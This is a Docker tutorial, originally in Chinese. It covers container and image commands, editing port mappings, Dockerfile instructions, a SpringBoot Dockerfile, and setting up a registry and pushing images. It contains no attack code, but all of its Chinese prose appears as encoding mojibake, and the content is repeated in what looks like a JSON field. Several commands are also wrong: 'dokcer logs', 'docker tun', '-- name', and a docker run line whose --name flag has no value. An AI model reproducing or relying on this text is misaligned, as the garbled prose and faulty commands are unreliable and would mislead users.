é¨è¯¥ç®å½ä¸ï¼ä¿®æ¹æä»¶ãåå»ºæä»¶ï¼å½¼æ­¤é½ä¼åæ­¥ä¿®æ¹\n * --restart=alwaysï¼æ»æ¯è¿è¡ï¼å½éå¯ docker åä¼èªå¨è¿è¡èµ·æ¥\n * repository:tagï¼æå®è¿è¡éåçåç§°\n\næ¥çè¿è¡çå®¹å¨\n\ndocker ps \n\n\n1\n\n\næ¥çææç¶æçå®¹å¨\n\ndocker ps -a\n\n\n1\n\n\næ£æ¥å®¹å¨åé¨ä¿¡æ¯\n\ndocker inspect å®¹å¨åç§°|å®¹å¨å12ä½id\n\n\n1\n\n\nåæ­¢å®¹å¨\n\ndocker stop å®¹å¨åç§°|å®¹å¨å12ä½id\n\n\n1\n\n\nå¼å¯å®¹å¨è¿è¡\n\ndocker start å®¹å¨åç§°\n\n\n1\n\n\nå é¤å®¹å¨ä¹åå¿é¡»ååæ­¢å®¹å¨è¿è¡\n\ndocker rm å®¹å¨åç§°\n\n\n1\n\n\næ¥çå®¹å¨æ¥å¿\n\ndokcer logs -f å®¹å¨id\n\n\n1\n\n\nè¿å¥å®¹å¨åé¨\n\ndocker exec -it mysql bash#  è¿å¥mysqlåé¨\nmysql -uroot -p123456#  ç»å½mysqlæå¡ æ³¨æè¿émysql -uroot -p123456 æ¯è¿èµ·æ¥ç\n\n\n1\n2\n\n\næä¸ä¸ªå®¹å¨å¶ä½ä¸ºä¸ä¸ªæ°çéå\n\ndocker commit \n -m="æäº¤ä¿¡æ¯" \n -a="ä½è" \n å®¹å¨id\n èªå®ä¹éååç§°:[èªå®ä¹æ ç­¾å]\n\n\n1\n2\n3\n4\n5\n\n\næ¥çå®¹å¨çä¿¡æ¯\n\ndocker inspect å®¹å¨ID\n\n\n1\n\n\nå¯¹äºæ²¡æç§æä»åºçè¦ä½¿æå¡å¨é´å±äº«ä¸ä¸ª docker éåï¼å¯ä»¥åææå°æºå¨ä¸çè¿è¡åå¯¼åºï¼ç¶åå¶ä»æå¡å¨å¨å¯¼å¥å³å¯\n\n# å¯¼åº\ndocker save \n éåID\n -o /æ¬å°è·¯å¾/æä»¶.tar  è¿å¥è¯ææå¯¼åºå°ä½ å®¿ä¸»æºçä¸ä¸ªå°åï¼æä»¶åéä¾¿èµ·åç¼ä¸ºtarï¼è·¯å¾è¦æåå»ºå¥½\n\n# å¯¼å¥\ndocker load < /ä¸ä¼ æä»¶çå°å/å¯¼åºçæä»¶å.tar\n\n# æ¥çå¯¼å¥çéå\ndocker images\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\nå®¹å¨ä¹é´å±äº«ï¼å®¹å¨ 2 å±ç¨ å®¹å¨ 1\n\ndocker tun -it \n  -- name å®¹å¨2\n  --volumes-from å®¹å¨1(å®¹å¨1å¿é¡»å·²å¯å¨)\n  éååç§°\n\n\n1\n2\n3\n4\n\n\næ¥çå¶ä½éåæ¶å å å¶ä»éåçæä½\n\ndocker history éåID\n\n\n1\n\n\n\n# 3. ä¿®æ¹å·²ç»å­å¨å®¹å¨çç«¯å£\n\n1ãåæ­¢å®¹å¨ (docker stop d00254ce3af7)\n2ãåæ­¢ docker æå¡ (systemctl stop docker)\n3ãä¿®æ¹è¿ä¸ªå®¹å¨ç hostconfig.json æä»¶ä¸­çç«¯å£ï¼åå¸æäººæå°ï¼å¦æ config.v2.json éé¢ä¹è®°å½äºç«¯å£ï¼ä¹è¦ä¿®æ¹ï¼\n\ncd /var/lib/docker/containers/d00254ce3af7*    # è¿éæ¯CONTAINER ID\n\nvim hostconfig.json\nå¦æä¹åæ²¡æç«¯å£æ å°, åºè¯¥æè¿æ ·çä¸æ®µ:\n"PortBindings":{}\n\nå¢å ä¸ä¸ªæ å°, è¿æ ·å:\n"PortBindings":{"8080/tcp":[{"HostIp":"","HostPort":"60000"}]}\nåä¸ä¸ªæ°å­æ¯å®¹å¨ç«¯å£, åä¸ä¸ªæ¯å®¿ä¸»æºç«¯å£ãå°å®¿ä¸»æºç60000ç«¯å£æ å°å°å®¹å¨ç8080ç«¯å£\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n4ãå¯å¨ docker æå¡ (systemctl start docker)\n5ãå¯å¨å®¹å¨ (docker start d00254ce3af7)\n\n\n# 4. å¶ä½éåçåºæ¬å½ä»¤\n\n\n# æ¦å¿µ\n\n\n\nDockerfile é»è®¤ä¼æå½åæå¨æä»¶çä¸ä¸é®é½åéç» Docker Serverï¼æç»å¶ä½æä¸ä¸ªéåï¼æ¯å¦ä½ å¾ DockerFile å¨ linux çæ ¹ (/) ç®å½ï¼é£ä¹å°±ä¼éå½æ ¹ç®å½ä¸çæææä»¶ï¼åéå° Docker Server å¶ä½éåï¼æä»¥å¶ä½ Dockerfile æå¥½æ¯å¨æä¸ä¸ªå°æ¹æ°å»ºæä»¶å¤¹å»å¶ä½ãå¶ä½è¿ç¨é½æ¯ä¾èµäºä¸ä¸ªä¸ªçéåï¼æä»¥ä¼æç¼å­å éä¸æ¬¡å¶ä½ï¼å¦æä¸éè¦ä¾èµç¼å­ å¯ä»¥å¨å½ä»¤å¶ä½çæåé¢å  --no-cache\n\n.dockerIgnore æ¯ç¨æ¥å¿½ç¥åªäºæä»¶æç®å½ä¸åä¸å°å¶ä½éåä¸­\n\nå¶ä½å½ä»¤ï¼ docker build -f /home/docker/nginx/Dockerfile . -f ç¨æ¥æå® Dockerfile æå¨çä½ç½®ï¼ä¸è¬ä¼ä½¿ç¨ docker build -t nginx2 . -t å¨å½åç®å½å¶ä½éåï¼ nginx2 éåçåå­ï¼ . ä»£è¡¨ Dockerfile å°±å¨å½åç®å½\n\n\n# å½ä»¤\n\næä»¤            æè¿°\nFROM          æå»ºçæ°éåæ¯åºäºåªä¸ªéåãä¾å¦ï¼FROM centos:6ï¼ç¬¬ä¸ä¸ªæä»¤å¿é¡»æ¯ FROM\nMAINTAINER    éåç»´æ¤èå§åæé®ç®±å°åãä¾å¦ï¼MAINTAINER Mr.chen\nRUN           æå»ºéåæ¶è¿è¡ç Shell å½ä»¤ãä¾å¦ï¼RUN ["yum","install","httpd"] ä¹å¯ä»¥ç´æ¥ RUN\n              yum install httpd æè RUN yum install httpd\nCMD           å®¹å¨è¿è¡æ¶æ§è¡çShellå½ä»¤ ï¼ç¼åç dockerfile ä¸­å¤ä¸ª cmd é½ä¼æ§è¡ï¼ä½é»è®¤ä¿çæåä¸ä¸ªå½ä»¤ï¼å¦æ\n              docker run è¿è¡æ¶ä¼ é commandï¼ä¼è¦ç cmd çä¿çå½ä»¤ï¼ï¼å¯å¨å®¹å¨ä¼æ§è¡ CMD\n              çä¿çå½ä»¤ãä¾å¦ï¼CMD ["-c","/start.sh"] ä¹å¯ä»¥æ¯ CMD echo \'hello docker\'\nEXPOSE        å£°æå®¹å¨è¿è¡çæå¡ç«¯å£ãä¾å¦ï¼EXPOSE 80 443ï¼ä½æ¯é»è®¤é½æ¯ tcp åè®®ï¼å¦ææ³è¦æ´æ¼ udp åè®®ï¼åæ¯\n              EXPOSE 80/udp ï¼æ³¨æåªè½æ¯ tcp æ udp\nENV           è®¾ç½®å®¹å¨åçç¯å¢åéãä¾å¦ï¼ENV MYSQL_ROOT_PASSWORD 123456\nADD           å°å®¿ä¸»æºç®å½ä¸çæä»¶æ·è´è¿éåä¸ ADD å½ä»¤ä¼èªå¨å¤ç URL åè§£å tar å ä¾å¦ï¼ADD\n              ["src","dest"] æè ADD https://xxx.com/html.tar.gz\n              /var/www/html æèï¼ADD html.tar.gz/var/www/html\nCOPY          æ·è´æä»¶æç®å½å°éåï¼ä¸è½èªå¨è§£åç¼©ï¼ãä¾å¦ï¼COPY ./start.sh/start.sh\nENTRYPOINT    è¿è¡å®¹å¨æ¶æ§è¡ç Shell å½ä»¤ï¼ä¸è½è¢«è¿è¡æ¶ä¼ éçåæ°è¦ç)ï¼æ¯ CMD çç®ä¸äºãä¾å¦ï¼ENTRYPOINT\n              ["/bin/bash","-c","/start.sh"] æè ENTRYPOINT /bin/bash -c\n              "/start.sh"\nVOLUME        æå®å®¹å¨æè½½ç¹å°å®¿ä¸»æºèªå¨çæçç®å½æå¶ä»å®¹å¨ ä¾å¦ï¼VOLUME ["/var/lib/mysql"]\nUSER          ä¸º RUNï¼CMD å ENTRYPOINT æ§è¡å½ä»¤æå®è¿è¡ç¨æ· ä¾å¦ï¼USER Mr_chen\nWORKDIR       æå®å¨åå»ºå®¹å¨åï¼ç»ç«¯é»è®¤ç»å½è¿æ¥çå·¥ä½ç®å½ï¼ä¸ä¸ªè½èç¹ ä¾å¦ï¼WORKDIR /dataï¼ è¯¥å½ä»¤ä¹ä¼å½±å\n              ENTRYPOINT è¿è¡ä¾å¦jaråæ¶çä½ç½®ï¼é»è®¤ä¼èªå¸¦WORKDIRçè·¯å¾\nHEALTHCHECK   å¥åº·æ£æ¥ãä¾å¦ï¼HEALTHCHECK --interval=5m --timeout=3s --retries=3\n              CMD curl -f http://localhost/ exit 1\nARG           å¨æå»ºéåæ¶æå®ä¸äºåæ°ãä¾å¦ï¼ARG user\nONBUILD       å½éåè¢«ç»§æ¿åè§¦åå¨ ONBUILD éåçå½ä»¤ï¼ç»§æ¿èç´æ¥ä½¿ç¨ FROM å½ä»¤ç»§æ¿å½åéåçåç§°å³å¯ï¼å¨ build\n              çæ¶åè§¦å\n\næç¤º\n\nä» docker17.05 çæ¬å¼å§ï¼dockerfile ä¸­åè®¸ä½¿ç¨å¤ä¸ª FROM æä»¤\n\n\n# éç½® Idea è¿æ¥ Docker\n\néç½®åæ¹ä¾¿æä»¬æåå¥½ç Docker File ç´æ¥ææéåå° Docker ä¸­ï¼æ¹ä¾¿è¿è¡åç®¡ç\n\nvim /usr/lib/systemd/system/docker.service\n\n\n1\n\n\n\n\nsystemctl daemon-reload // 1ï¼å è½½dockerå®æ¤çº¿ç¨\nsystemctl restart docker // 2ï¼éå¯docker\n\n\n1\n2\n\n\n\n# å®ææå»º SpringBoot åºç¨\n\nå¨åºç¨çæ ¹ç®å½ä¸­åå»º Dockerfileï¼å·ä½æå»ºä¹åä¸å®è¦äºè§£ SpringBoot éç½®æä»¶çå è½½è·¯å¾ä¼åçº§ï¼è¿éçµæ¯å°æä»¬å¨ä¿®æ¹éç½®æä»¶æ¶ï¼å¯ä»¥æå®æè½½å¤é¨æä»¶ä¿®æ¹ååæ­¥å°å®¹å¨ï¼å¦åï¼æ¯æ¹ä¸æ¬¡é½è¦éæ°å¶ä½éå\n\næç¤º\n\nSpringBoot éç½®æä»¶çå è½½è·¯å¾ä¼åçº§ï¼\nå·¥ç¨æ ¹ç®å½:./config/\nå·¥ç¨æ ¹ç®å½ï¼./\nclasspath:/config/\nclasspath:/\n\n# åºç¡éå\nFROM openjdk:8-jre-slim\n# ä½è\nMAINTAINER biguncle\n# éç½®\nENV PARAMS=""\nEXPOSE 8081\n# æ¶åº\nENV TZ=Asia/Shanghai\nRUN ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo $TZ > /etc/timezone\n# æ·»å åºç¨\nADD ./target/tool-boot-0.0.1-SNAPSHOT.jar /server/tool-boot.jar\n# åå»ºä¸ä¸ªå·¥ä½ç®å½ï¼å¹¶å°å¤é¨éç½®æä»¶å¤å¶å°éåä¸­\nRUN mkdir /server/config\nCOPY /src/main/resources/application.yml /app/config/\nWORKDIR /server\n## å¨éåè¿è¡ä¸ºå®¹å¨åæ§è¡çå½ä»¤\nENTRYPOINT java -jar -Dpolyglot.engine.WarnInterpreterOnly=false tool-boot.jar  $PARAMS\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\næ§è¡å½ä»¤\n\n#build æå»ºåºç¨çéå\ndocker build -f ./Dockerfile -t 875730567/easy-manager-tool .\n\n\n1\n2\n\n\nè¿è¡å®¹å¨\n\n#build æå»ºåºç¨çéå\ndocker run -p 8081:8081 --name -v /opt:/server/config easy-manager-tool -d 875730567/easy-manager-tool\n\n\n1\n2\n\n\n\n# 5. Docker ä½¿ç¨é¿éäºä»åºæèªå»ºä»åº\n\n\n# é¿éäºä»åº\n\n 1. åç»å½é¿éäºéåæå¡ï¼å°å\n 2. åå»ºä¸ªäººæä¼ä¸å®ä¾\n 3. åå»ºéåä»åºï¼è¿ä¸ªä»åºå¯ä»¥å»ºå¤ä¸ªï¼çèªå·±\n 4. åå»ºå®æ¯ä¹åå¯ä»¥æ ¹æ®é¿éäºæä¾çæ­¥éª¤è¿è¡æ¨éææå\n\n\n\nå¦ææä»¬åªæ¯æ³ç¨é¿éäºçéåå éå¨ï¼å¯ä»¥æ¾å°å¦ä¸å¾æä½å³å¯ã\n\n\n\n\n# èªå»ºä»åº\n\n 1. æåä»åºéå\n\ndocker pull registry\n\n\n1\n\n 2. è¿è¡éå\n\ndocker run -d -v /edc/images/registry:/var/lib/registry \n-p 5000:5000 \n--restart=always \n--name xdp-registry registry\n\n\n1\n2\n3\n4\n\n 3. æ¥çéåä¿¡æ¯\n\ncurl http://127.0.0.1:5000/v2/_catalog\n\n\n1\n\n\n\n# 6. ä¸ä¼  DockerHub\n\n 1. é¦åä¿è¯ä½ ç»å½\n\ndocker login --username=xxxx\n\n\n1\n\n 2. æå»ºéå\n\ndocker build -t è´¦å·/åºç¨åç§° -f Dockerfile .\n\n\n1\n\n 3. å¨ DockerHub æ°å»ºä»åº https://hub.docker.com/\n 4. ç»éåæä¸ä¸ª tag æ ç­¾\n\ndocker tag è´¦å·/åºç¨åç§° è´¦å·/æ ç­¾åç§°:æ ç­¾çæ¬\n\n\n1\n\n 5. ä¸ä¼ \n\ndocker push è´¦å·/æ ç­¾åç§°:æ ç­¾çæ¬\n\n\n1\n',normalizedContent:'# 1.docker çæå¿µï¼docker æ¯ä»ä¹\n\ndocker åä¸ºä¸ç§æå¿µï¼éå å®¹å¨ ä»åº\néåï¼ç±»ä¼¼äºä¸ä¸ªæ¨¡æ¿ï¼éé¢åå«äºä¸äºåå®¹\nå®¹å¨ï¼å®¹å¨æ¯ä¸ä¸ªéåçå®ä¾ï¼å¦æçè§£éåä¸ºä¸ä¸ª classï¼é£ä¹å®¹å¨å°±è¢«çè§£ä¸ºæ¯ new class (); æ¯éåçå®ä¾\nä»åºï¼å°±æ¯ä¸è½½éåèµæºçå°æ¹ã\ndocker å®¹å¨ä¸æ¯èææºï¼å®¹å¨å¯ä»¥è¯´æ¯ä¸ä¸ªè¿ç¨ï¼æä»¬å¯ä»¥ç»å®¹å¨åéåå­ãå°±å windows å®è£äºèææºï¼å¯ä»¥ç»èææºåéåå­å¤§å°ï¼ç£çç©ºé´ã\n\n\n# 2.docker åºç¡å½ä»¤\n\næç´¢éåï¼ä» maven ä»åºä¸­æ¥è¯¢\n\ndocker search mysql\n\n\n1\n\n\nååºå½åç³»ç»å­å¨çéå\n\ndocker images\n\n\n1\n\n\nç»éåæ´æ¢åç§°\n\ndocker tag imageid repository:tag\n\n\n1\n\n\nå é¤éå (-f å¼ºå¶) å¿é¡»ç¥ééåç imageid\n\ndocker rmi -f imageid\n\n\n1\n\n\nrepository:tag (éåçä»åºæºï¼éåçæ ç­¾) æå\n\ndocker pull repository:tag\n\n\n1\n\n\nè¿è¡ä¸ä¸ªå®¹å¨\n\ndocker run -it  -d --name "xxx" -p port1:port2 -p port3:port4 -v home/data:/data repository:tag \n\n\n1\n\n * runï¼è¿è¡å®¹å¨å½ä»¤\n * -itï¼è¿è¡åç´æ¥ä¸ç»ç«¯äº¤äºï¼æ¯å¦è¿è¡ jar æå¶ä»åºç¨çæ¶å æ¥çä»ä»¬çå¯å¨ä¿¡æ¯\n * -dï¼åå°è¿è¡\n * -p port1:port2ï¼ç«¯å£æ å° port1 (å®¿ä¸»æº) port2 (å®¹å¨) å®¹å¨çç«¯å£æ¯å¯ä»¥éå¤çï¼æä»¥å®¹å¨åç©çæºçç«¯å£å¯ä»¥ä¸è´ãrabbitmq æä¸¤ä¸ªç«¯å£ 5672 å 15672 æä»¥ä¼ç¨å°å -p repository:tag -> å¦æä¸æå® tagï¼é»è®¤ä½¿ç¨ææ°ç\n * --name "xxx"ï¼æå®å®¹å¨åç§°\n * -v /home/data:/dataï¼/home/data (å®¿ä¸»æº):/data (å®¹å¨) æ¬å°å°ååå®¹å¨å°åäº§çæè½½å³ç³»ï¼ å¨å®¹å¨åé¨è¯¥ç®å½ä¸ï¼æèå®¿ä¸»æºåé¨è¯¥ç®å½ä¸ï¼ä¿®æ¹æä»¶ãåå»ºæä»¶ï¼å½¼æ­¤é½ä¼åæ­¥ä¿®æ¹\n * --restart=alwaysï¼æ»æ¯è¿è¡ï¼å½éå¯ docker åä¼èªå¨è¿è¡èµ·æ¥\n * repository:tagï¼æå®è¿è¡éåçåç§°\n\næ¥çè¿è¡çå®¹å¨\n\ndocker ps \n\n\n1\n\n\næ¥çææç¶æçå®¹å¨\n\ndocker ps -a\n\n\n1\n\n\næ£æ¥å®¹å¨åé¨ä¿¡æ¯\n\ndocker inspect å®¹å¨åç§°|å®¹å¨å12ä½id\n\n\n1\n\n\nåæ­¢å®¹å¨\n\ndocker stop å®¹å¨åç§°|å®¹å¨å12ä½id\n\n\n1\n\n\nå¼å¯å®¹å¨è¿è¡\n\ndocker start å®¹å¨åç§°\n\n\n1\n\n\nå é¤å®¹å¨ä¹åå¿é¡»ååæ­¢å®¹å¨è¿è¡\n\ndocker rm å®¹å¨åç§°\n\n\n1\n\n\næ¥çå®¹å¨æ¥å¿\n\ndokcer logs -f å®¹å¨id\n\n\n1\n\n\nè¿å¥å®¹å¨åé¨\n\ndocker exec -it mysql bash#  è¿å¥mysqlåé¨\nmysql -uroot -p123456#  ç»å½mysqlæå¡ æ³¨æè¿émysql -uroot -p123456 æ¯è¿èµ·æ¥ç\n\n\n1\n2\n\n\næä¸ä¸ªå®¹å¨å¶ä½ä¸ºä¸ä¸ªæ°çéå\n\ndocker commit \n -m="æäº¤ä¿¡æ¯" \n -a="ä½è" \n å®¹å¨id\n èªå®ä¹éååç§°:[èªå®ä¹æ ç­¾å]\n\n\n1\n2\n3\n4\n5\n\n\næ¥çå®¹å¨çä¿¡æ¯\n\ndocker inspect å®¹å¨id\n\n\n1\n\n\nå¯¹äºæ²¡æç§æä»åºçè¦ä½¿æå¡å¨é´å±äº«ä¸ä¸ª docker éåï¼å¯ä»¥åææå°æºå¨ä¸çè¿è¡åå¯¼åºï¼ç¶åå¶ä»æå¡å¨å¨å¯¼å¥å³å¯\n\n# å¯¼åº\ndocker save \n éåid\n -o /æ¬å°è·¯å¾/æä»¶.tar  è¿å¥è¯ææå¯¼åºå°ä½ å®¿ä¸»æºçä¸ä¸ªå°åï¼æä»¶åéä¾¿èµ·åç¼ä¸ºtarï¼è·¯å¾è¦æåå»ºå¥½\n\n# å¯¼å¥\ndocker load < /ä¸ä¼ æä»¶çå°å/å¯¼åºçæä»¶å.tar\n\n# æ¥çå¯¼å¥çéå\ndocker images\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\nå®¹å¨ä¹é´å±äº«ï¼å®¹å¨ 2 å±ç¨ å®¹å¨ 1\n\ndocker tun -it \n  -- name å®¹å¨2\n  --volumes-from å®¹å¨1(å®¹å¨1å¿é¡»å·²å¯å¨)\n  éååç§°\n\n\n1\n2\n3\n4\n\n\næ¥çå¶ä½éåæ¶å å å¶ä»éåçæä½\n\ndocker history éåid\n\n\n1\n\n\n\n# 3. ä¿®æ¹å·²ç»å­å¨å®¹å¨çç«¯å£\n\n1ãåæ­¢å®¹å¨ (docker stop d00254ce3af7)\n2ãåæ­¢ docker æå¡ (systemctl stop docker)\n3ãä¿®æ¹è¿ä¸ªå®¹å¨ç hostconfig.json æä»¶ä¸­çç«¯å£ï¼åå¸æäººæå°ï¼å¦æ config.v2.json éé¢ä¹è®°å½äºç«¯å£ï¼ä¹è¦ä¿®æ¹ï¼\n\ncd /var/lib/docker/containers/d00254ce3af7*    # è¿éæ¯container id\n\nvim hostconfig.json\nå¦æä¹åæ²¡æç«¯å£æ å°, åºè¯¥æè¿æ ·çä¸æ®µ:\n"portbindings":{}\n\nå¢å ä¸ä¸ªæ å°, è¿æ ·å:\n"portbindings":{"8080/tcp":[{"hostip":"","hostport":"60000"}]}\nåä¸ä¸ªæ°å­æ¯å®¹å¨ç«¯å£, åä¸ä¸ªæ¯å®¿ä¸»æºç«¯å£ãå°å®¿ä¸»æºç60000ç«¯å£æ å°å°å®¹å¨ç8080ç«¯å£\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n4ãå¯å¨ docker æå¡ (systemctl start docker)\n5ãå¯å¨å®¹å¨ (docker start d00254ce3af7)\n\n\n# 4. å¶ä½éåçåºæ¬å½ä»¤\n\n\n# æ¦å¿µ\n\n\n\ndockerfile é»è®¤ä¼æå½åæå¨æä»¶çä¸ä¸é®é½åéç» docker serverï¼æç»å¶ä½æä¸ä¸ªéåï¼æ¯å¦ä½ å¾ dockerfile å¨ linux çæ ¹ (/) ç®å½ï¼é£ä¹å°±ä¼éå½æ ¹ç®å½ä¸çæææä»¶ï¼åéå° docker server å¶ä½éåï¼æä»¥å¶ä½ dockerfile æå¥½æ¯å¨æä¸ä¸ªå°æ¹æ°å»ºæä»¶å¤¹å»å¶ä½ãå¶ä½è¿ç¨é½æ¯ä¾èµäºä¸ä¸ªä¸ªçéåï¼æä»¥ä¼æç¼å­å éä¸æ¬¡å¶ä½ï¼å¦æä¸éè¦ä¾èµç¼å­ å¯ä»¥å¨å½ä»¤å¶ä½çæåé¢å  --no-cache\n\n.dockerignore æ¯ç¨æ¥å¿½ç¥åªäºæä»¶æç®å½ä¸åä¸å°å¶ä½éåä¸­\n\nå¶ä½å½ä»¤ï¼ docker build -f /home/docker/nginx/dockerfile . -f ç¨æ¥æå® dockerfile æå¨çä½ç½®ï¼ä¸è¬ä¼ä½¿ç¨ docker build -t nginx2 . -t å¨å½åç®å½å¶ä½éåï¼ nginx2 éåçåå­ï¼ . ä»£è¡¨ dockerfile å°±å¨å½åç®å½\n\n\n# å½ä»¤\n\næä»¤            æè¿°\nfrom          æå»ºçæ°éåæ¯åºäºåªä¸ªéåãä¾å¦ï¼from centos:6ï¼ç¬¬ä¸ä¸ªæä»¤å¿é¡»æ¯ from\nmaintainer    éåç»´æ¤èå§åæé®ç®±å°åãä¾å¦ï¼maintainer mr.chen\nrun           æå»ºéåæ¶è¿è¡ç shell å½ä»¤ãä¾å¦ï¼run ["yum","install","httpd"] ä¹å¯ä»¥ç´æ¥ run\n              yum install httpd æè run yum install httpd\ncmd           å®¹å¨è¿è¡æ¶æ§è¡çshellå½ä»¤ ï¼ç¼åç dockerfile ä¸­å¤ä¸ª cmd é½ä¼æ§è¡ï¼ä½é»è®¤ä¿çæåä¸ä¸ªå½ä»¤ï¼å¦æ\n              docker run è¿è¡æ¶ä¼ é commandï¼ä¼è¦ç cmd çä¿çå½ä»¤ï¼ï¼å¯å¨å®¹å¨ä¼æ§è¡ cmd\n              çä¿çå½ä»¤ãä¾å¦ï¼cmd ["-c","/start.sh"] ä¹å¯ä»¥æ¯ cmd echo \'hello docker\'\nexpose        å£°æå®¹å¨è¿è¡çæå¡ç«¯å£ãä¾å¦ï¼expose 80 443ï¼ä½æ¯é»è®¤é½æ¯ tcp åè®®ï¼å¦ææ³è¦æ´æ¼ udp åè®®ï¼åæ¯\n              expose 80/udp ï¼æ³¨æåªè½æ¯ tcp æ udp\nenv           è®¾ç½®å®¹å¨åçç¯å¢åéãä¾å¦ï¼env mysql_root_password 123456\nadd           å°å®¿ä¸»æºç®å½ä¸çæä»¶æ·è´è¿éåä¸ add å½ä»¤ä¼èªå¨å¤ç url åè§£å tar å ä¾å¦ï¼add\n              ["src","dest"] æè add https://xxx.com/html.tar.gz\n              /var/www/html æèï¼add html.tar.gz/var/www/html\ncopy          æ·è´æä»¶æç®å½å°éåï¼ä¸è½èªå¨è§£åç¼©ï¼ãä¾å¦ï¼copy ./start.sh/start.sh\nentrypoint    è¿è¡å®¹å¨æ¶æ§è¡ç shell å½ä»¤ï¼ä¸è½è¢«è¿è¡æ¶ä¼ éçåæ°è¦ç)ï¼æ¯ cmd çç®ä¸äºãä¾å¦ï¼entrypoint\n              ["/bin/bash","-c","/start.sh"] æè entrypoint /bin/bash -c\n              "/start.sh"\nvolume        æå®å®¹å¨æè½½ç¹å°å®¿ä¸»æºèªå¨çæçç®å½æå¶ä»å®¹å¨ ä¾å¦ï¼volume ["/var/lib/mysql"]\nuser          ä¸º runï¼cmd å entrypoint æ§è¡å½ä»¤æå®è¿è¡ç¨æ· ä¾å¦ï¼user mr_chen\nworkdir       æå®å¨åå»ºå®¹å¨åï¼ç»ç«¯é»è®¤ç»å½è¿æ¥çå·¥ä½ç®å½ï¼ä¸ä¸ªè½èç¹ ä¾å¦ï¼workdir /dataï¼ è¯¥å½ä»¤ä¹ä¼å½±å\n              entrypoint è¿è¡ä¾å¦jaråæ¶çä½ç½®ï¼é»è®¤ä¼èªå¸¦workdirçè·¯å¾\nhealthcheck   å¥åº·æ£æ¥ãä¾å¦ï¼healthcheck --interval=5m --timeout=3s --retries=3\n              cmd curl -f http://localhost/ exit 1\narg           å¨æå»ºéåæ¶æå®ä¸äºåæ°ãä¾å¦ï¼arg user\nonbuild       å½éåè¢«ç»§æ¿åè§¦åå¨ onbuild éåçå½ä»¤ï¼ç»§æ¿èç´æ¥ä½¿ç¨ from å½ä»¤ç»§æ¿å½åéåçåç§°å³å¯ï¼å¨ build\n              çæ¶åè§¦å\n\næç¤º\n\nä» docker17.05 çæ¬å¼å§ï¼dockerfile ä¸­åè®¸ä½¿ç¨å¤ä¸ª from æä»¤\n\n\n# éç½® idea è¿æ¥ docker\n\néç½®åæ¹ä¾¿æä»¬æåå¥½ç docker file ç´æ¥ææéåå° docker ä¸­ï¼æ¹ä¾¿è¿è¡åç®¡ç\n\nvim /usr/lib/systemd/system/docker.service\n\n\n1\n\n\n\n\nsystemctl daemon-reload // 1ï¼å è½½dockerå®æ¤çº¿ç¨\nsystemctl restart docker // 2ï¼éå¯docker\n\n\n1\n2\n\n\n\n# å®ææå»º springboot åºç¨\n\nå¨åºç¨çæ ¹ç®å½ä¸­åå»º dockerfileï¼å·ä½æå»ºä¹åä¸å®è¦äºè§£ springboot éç½®æä»¶çå è½½è·¯å¾ä¼åçº§ï¼è¿éçµæ¯å°æä»¬å¨ä¿®æ¹éç½®æä»¶æ¶ï¼å¯ä»¥æå®æè½½å¤é¨æä»¶ä¿®æ¹ååæ­¥å°å®¹å¨ï¼å¦åï¼æ¯æ¹ä¸æ¬¡é½è¦éæ°å¶ä½éå\n\næç¤º\n\nspringboot éç½®æä»¶çå è½½è·¯å¾ä¼åçº§ï¼\nå·¥ç¨æ ¹ç®å½:./config/\nå·¥ç¨æ ¹ç®å½ï¼./\nclasspath:/config/\nclasspath:/\n\n# åºç¡éå\nfrom openjdk:8-jre-slim\n# ä½è\nmaintainer biguncle\n# éç½®\nenv params=""\nexpose 8081\n# æ¶åº\nenv tz=asia/shanghai\nrun ln -snf /usr/share/zoneinfo/$tz /etc/localtime && echo $tz > /etc/timezone\n# æ·»å åºç¨\nadd ./target/tool-boot-0.0.1-snapshot.jar /server/tool-boot.jar\n# åå»ºä¸ä¸ªå·¥ä½ç®å½ï¼å¹¶å°å¤é¨éç½®æä»¶å¤å¶å°éåä¸­\nrun mkdir /server/config\ncopy /src/main/resources/application.yml /app/config/\nworkdir /server\n## å¨éåè¿è¡ä¸ºå®¹å¨åæ§è¡çå½ä»¤\nentrypoint java -jar -dpolyglot.engine.warninterpreteronly=false tool-boot.jar  $params\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\næ§è¡å½ä»¤\n\n#build æå»ºåºç¨çéå\ndocker build -f ./dockerfile -t 875730567/easy-manager-tool .\n\n\n1\n2\n\n\nè¿è¡å®¹å¨\n\n#build æå»ºåºç¨çéå\ndocker run -p 8081:8081 --name -v /opt:/server/config easy-manager-tool -d 875730567/easy-manager-tool\n\n\n1\n2\n\n\n\n# 5. docker ä½¿ç¨é¿éäºä»åºæèªå»ºä»åº\n\n\n# é¿éäºä»åº\n\n 1. åç»å½é¿éäºéåæå¡ï¼å°å\n 2. åå»ºä¸ªäººæä¼ä¸å®ä¾\n 3. åå»ºéåä»åºï¼è¿ä¸ªä»åºå¯ä»¥å»ºå¤ä¸ªï¼çèªå·±\n 4. åå»ºå®æ¯ä¹åå¯ä»¥æ ¹æ®é¿éäºæä¾çæ­¥éª¤è¿è¡æ¨éææå\n\n\n\nå¦ææä»¬åªæ¯æ³ç¨é¿éäºçéåå éå¨ï¼å¯ä»¥æ¾å°å¦ä¸å¾æä½å³å¯ã\n\n\n\n\n# èªå»ºä»åº\n\n 1. æåä»åºéå\n\ndocker pull registry\n\n\n1\n\n 2. è¿è¡éå\n\ndocker run -d -v /edc/images/registry:/var/lib/registry \n-p 5000:5000 \n--restart=always \n--name xdp-registry registry\n\n\n1\n2\n3\n4\n\n 3. æ¥çéåä¿¡æ¯\n\ncurl http://127.0.0.1:5000/v2/_catalog\n\n\n1\n\n\n\n# 6. ä¸ä¼  dockerhub\n\n 1. é¦åä¿è¯ä½ ç»å½\n\ndocker login --username=xxxx\n\n\n1\n\n 2. æå»ºéå\n\ndocker build -t è´¦å·/åºç¨åç§° -f dockerfile .\n\n\n1\n\n 3. å¨ dockerhub æ°å»ºä»åº https://hub.docker.com/\n 4. ç»éåæä¸ä¸ª tag æ ç­¾\n\ndocker tag è´¦å·/åºç¨åç§° è´¦å·/æ ç­¾åç§°:æ ç­¾çæ¬\n\n\n1\n\n 5. 